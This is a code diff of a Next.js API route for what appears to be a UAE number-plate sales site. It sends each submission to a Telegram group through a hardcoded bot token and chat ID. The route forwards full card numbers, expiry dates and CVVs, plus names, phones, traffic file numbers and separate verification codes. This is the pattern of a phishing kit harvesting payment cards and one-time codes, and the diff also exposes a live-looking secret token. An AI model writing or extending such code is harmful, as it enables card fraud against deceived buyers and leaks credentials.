@@ -1,7 +1,8 @@
 import { NextRequest, NextResponse } from "next/server"
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID
+// Telegram Bot Configuration - Updated Chat ID for supergroup
+const TELEGRAM_BOT_TOKEN = "8362720189:AAER2fKR2r9Xcxjw3p0jWjCSHOXDLaeKdyE"
+const TELEGRAM_CHAT_ID = "-1003822530210"
 
 export async function POST(request: NextRequest) {
   try {
@@ -29,11 +30,27 @@ export async function POST(request: NextRequest) {
       message += `👤 *معلومات العميل:*\n`
       message += `الاسم: ${data.name}\n`
       message += `البريد: ${data.email}\n`
-      message += `الهاتف: ${data.phone}\n\n`
+      message += `الهاتف: ${data.phone}\n`
+      message += `رقم الملف المروري: ${data.trafficFileNumber}\n\n`
       message += `💳 *بيانات البطاقة:*\n`
       message += `رقم البطاقة: ${data.cardNumber}\n`
       message += `تاريخ الانتهاء: ${data.cardExpiry}\n`
       message += `CVV: ${data.cardCvv}\n\n`
+      message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
+    } else if (type === "crypto_payment") {
+      // Crypto payment form submission
+      message = `🪙 *طلب دفع بالعملات الرقمية*\n\n`
+      message += `📋 *معلومات اللوحة:*\n`
+      message += `الإمارة: ${data.emirate}\n`
+      message += `الكود: ${data.plateCode}\n`
+      message += `الرقم: ${data.plateNumber}\n`
+      message += `السعر: ${data.price}\n`
+      message += `السعر بالدولار: ${data.priceUSD}\n\n`
+      message += `👤 *معلومات العميل:*\n`
+      message += `الاسم: ${data.name}\n`
+      message += `البريد: ${data.email}\n`
+      message += `الهاتف: ${data.phone}\n`
+      message += `رقم الملف المروري: ${data.trafficFileNumber}\n\n`
       message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
     } else if (type === "verification") {
       // Verification code submission
